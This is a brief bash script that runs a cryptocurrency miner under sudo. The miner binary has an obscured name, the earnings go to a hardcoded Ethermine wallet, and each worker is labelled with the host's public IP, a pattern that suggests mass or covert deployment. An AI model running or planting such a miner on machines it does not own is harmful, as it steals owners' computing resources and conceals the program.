#!/bin/bash

POOL=ethproxy+tcp://asia1.ethermine.org:4444
WALLET=0x9dfc0ee06aad477e8cba3c51cdaea599d081c5b4
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-NBM

cd "$(dirname "$0")"

chmod +x ./dwwdew && sudo ./dwwdew -a ethash -o $POOL -u $WALLET.$WORKER $@
